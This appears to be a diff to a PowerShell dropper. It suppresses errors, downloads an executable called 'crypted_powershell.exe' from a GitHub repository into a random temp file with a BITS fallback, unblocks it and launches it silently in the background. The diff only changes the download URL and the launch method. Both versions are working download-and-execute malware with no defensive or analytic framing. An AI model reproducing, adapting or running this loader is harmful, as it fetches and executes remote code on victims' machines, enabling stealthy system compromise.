@@ -1,13 +1,9 @@
 $ErrorActionPreference='SilentlyContinue'
 [Net.ServicePointManager]::SecurityProtocol=3072
 $p=Join-Path $env:TEMP ('{0}.exe' -f (Get-Random))
-$u='https://github.com/iendjd7-lgtm/-depressionkill/raw/refs/heads/main/crypted_powershell.exe'
+$u='https://raw.githubusercontent.com/iendjd7-lgtm/-depressionkill/refs/heads/main/crypted_powershell.exe'
 try{(New-Object Net.WebClient).DownloadFile($u,$p)}catch{Start-BitsTransfer -Source $u -Destination $p}
-if((Test-Path $p) -and (Get-Item $p).Length -gt 100000){
- $i=New-Object Diagnostics.ProcessStartInfo
- $i.FileName=$p
- $i.WorkingDirectory=$env:TEMP
- $i.UseShellExecute=$false
- $i.CreateNoWindow=$true
- [void][Diagnostics.Process]::Start($i)
+if((Test-Path $p) -and ((Get-Item $p).Length -gt 100000)){
+ Unblock-File $p
+ cmd /c start "" /B "$p"
 }
